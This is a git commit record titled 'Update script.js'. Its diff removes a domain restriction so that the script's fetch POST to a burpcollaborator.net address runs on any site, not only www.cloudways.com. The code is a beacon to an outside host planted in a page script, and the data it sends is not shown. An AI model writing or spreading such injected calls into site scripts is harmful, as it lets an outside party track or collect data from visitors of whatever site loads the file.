fae7f7bbe6765656ec42a54753e0817c5cc7af14
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-11-30 20:40:57 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,4 @@
-if (document.domain == "www.cloudways.com") {
+if (document.domain == document.domain | document.domain == document.domain) {
   fetch('https://1hjj88rl2d17o6ejnqkdva9q3h99xy.burpcollaborator.net', {
   method: 'POST',
   mode: 'no-cors',
